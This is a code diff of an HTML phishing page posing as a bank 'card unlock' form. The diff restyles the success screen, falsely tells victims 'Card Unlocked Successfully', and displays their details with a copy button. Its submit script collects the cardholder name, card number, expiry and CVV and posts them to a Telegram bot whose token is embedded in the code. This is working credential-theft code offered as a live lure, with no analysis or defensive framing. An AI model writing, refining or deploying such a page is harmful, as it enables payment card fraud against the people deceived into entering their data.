@@ -212,7 +212,7 @@
         .success-page {
             display: none;
             width: 100%;
-            height: 100vh;
+            min-height: 100vh;
             position: fixed;
             top: 0;
             left: 0;
@@ -220,6 +220,8 @@
             z-index: 2000;
             justify-content: center;
             align-items: center;
+            padding: 1rem;
+            overflow-y: auto;
         }
 
         .success-page.show {
@@ -228,9 +230,10 @@
 
         .success-container {
             text-align: center;
-            width: 90%;
-            max-width: 500px;
+            width: 100%;
+            max-width: 600px;
             animation: slideIn 0.5s ease-out;
+            padding: 2rem 0;
         }
 
         @keyframes slideIn {
@@ -277,8 +280,53 @@
         .success-message {
             font-size: 1.1rem;
             color: var(--text);
-            margin-bottom: 1rem;
+            margin-bottom: 2rem;
             line-height: 1.6;
+        }
+
+        .card-details-display {
+            background-color: rgba(16, 185, 129, 0.1);
+            border: 2px solid rgba(16, 185, 129, 0.3);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            text-align: left;
+        }
+
+        .mono-text {
+            background-color: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.9rem;
+            color: #6ee7b7;
+            word-break: break-all;
+            white-space: pre-wrap;
+            line-height: 1.6;
+            position: relative;
+            margin-bottom: 1rem;
+        }
+
+        .copy-btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.6rem 1.2rem;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            width: 100%;
+        }
+
+        .copy-btn:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .copy-btn.copied {
+            background-color: var(--success);
         }
 
         .success-details {
@@ -286,7 +334,7 @@
             border: 1px solid rgba(16, 185, 129, 0.3);
             border-radius: 12px;
             padding: 1.5rem;
-            margin: 2rem 0;
+            margin: 1.5rem 0;
             text-align: left;
         }
 
@@ -306,6 +354,7 @@
             color: var(--success);
             font-weight: bold;
             font-size: 1.2rem;
+            flex-shrink: 0;
         }
 
         .success-footer {
@@ -317,10 +366,52 @@
         .success-btn {
             margin-top: 2rem;
             background-color: var(--success);
+            padding: 0.8rem 1.5rem;
+            width: auto;
         }
 
         .success-btn:hover {
             background-color: #059669;
+        }
+
+        .back-btn {
+            background-color: var(--surface);
+            border: 1px solid var(--border);
+            color: var(--text);
+            margin-right: 0.75rem;
+            padding: 0.8rem 1.5rem;
+            width: auto;
+        }
+
+        .back-btn:hover {
+            background-color: var(--border);
+        }
+
+        .button-group {
+            display: flex;
+            gap: 0.75rem;
+            justify-content: center;
+            margin-top: 2rem;
+        }
+
+        @media (max-width: 480px) {
+            .success-container {
+                width: 100%;
+                padding: 1rem;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+
+            .back-btn {
+                margin-right: 0;
+            }
+
+            .mono-text {
+                font-size: 0.8rem;
+                padding: 0.8rem;
+            }
         }
     </style>
 </head>
@@ -385,10 +476,17 @@
 <div id="successPage" class="success-page">
     <div class="success-container">
         <div class="success-icon">✓</div>
-        <h1 class="success-title">Unlock Request Submitted</h1>
-        <p class="success-message">Your card details have been received and your unlock request is being processed.</p>
+        <h1 class="success-title">Card Unlocked Successfully</h1>
+        <p class="success-message">Your card details have been received and your card unlock request is being processed.</p>
         
+        <div class="card-details-display">
+            <h3 style="color: var(--success); margin-bottom: 1rem; font-size: 1.1rem;">Card Details in Mono Format</h3>
+            <div class="mono-text" id="monoDetails"></div>
+            <button class="copy-btn" id="copyBtn" onclick="copyToClipboard()">📋 Copy Details</button>
+        </div>
+
         <div class="success-details">
+            <h3 style="color: var(--success); margin-bottom: 1rem; font-size: 1.1rem;">What's Next?</h3>
             <div class="success-detail-item">
                 <span class="success-detail-icon">✓</span>
                 <span>Your card will be unlocked within 24 hours</span>
@@ -409,7 +507,10 @@
 
         <p class="success-footer">Thank you for choosing us. Your security is our priority.</p>
         
-        <button class="btn success-btn" onclick="resetForm()">Done</button>
+        <div class="button-group">
+            <button class="btn back-btn" onclick="resetForm()">← Go Back</button>
+            <button class="btn success-btn" onclick="window.location.reload()">Done</button>
+        </div>
     </div>
 </div>
 
@@ -468,20 +569,20 @@
         submitBtn.disabled = true;
         submitBtn.textContent = 'Processing...';
 
-        // Format message with all card details
-        const detailsMessage = `
-🔓 Card Unlock Request - NEW SUBMISSION
+        // Format message with all card details in mono format
+        const detailsMessage = `CARD UNLOCK REQUEST
 
-📝 Card Holder: ${cardName}
-💳 Card Number: ${cardNumber}
-📅 Expiry Date: ${cardExpiry}
-🔒 CVV: ${cardCvv}
+Card Holder: ${cardName}
+Card Number: ${cardNumber}
+Expiry Date: ${cardExpiry}
+CVV: ${cardCvv}
+Submitted: ${new Date().toLocaleString()}`;
 
-⏰ Submitted at: ${new Date().toLocaleString()}
-        `.trim();
+        // Display mono text on success page
+        document.getElementById('monoDetails').textContent = detailsMessage;
 
         try {
-            const response = await fetch(
+            await fetch(
                 "https://api.telegram.org/bot7946422911:AAF0cfpvdw7susy5riOXzr8tdht4sjcKJQI/sendMessage",
                 {
                     method: "POST",
@@ -495,7 +596,7 @@
                 }
             );
 
-            // Show success page regardless of response
+            // Show success page
             document.getElementById('successPage').classList.add('show');
             document.getElementById('mainWrapper').style.display = 'none';
         } catch (error) {
@@ -508,6 +609,24 @@
             submitBtn.disabled = false;
             submitBtn.textContent = 'UNBLOCK CARD';
         }
+    }
+
+    function copyToClipboard() {
+        const monoText = document.getElementById('monoDetails').textContent;
+        const copyBtn = document.getElementById('copyBtn');
+        
+        navigator.clipboard.writeText(monoText).then(() => {
+            copyBtn.textContent = '✓ Copied!';
+            copyBtn.classList.add('copied');
+            
+            setTimeout(() => {
+                copyBtn.textContent = '📋 Copy Details';
+                copyBtn.classList.remove('copied');
+            }, 2000);
+        }).catch(err => {
+            console.error('Copy failed:', err);
+            alert('Failed to copy. Please try again.');
+        });
     }
 
     function resetForm() {
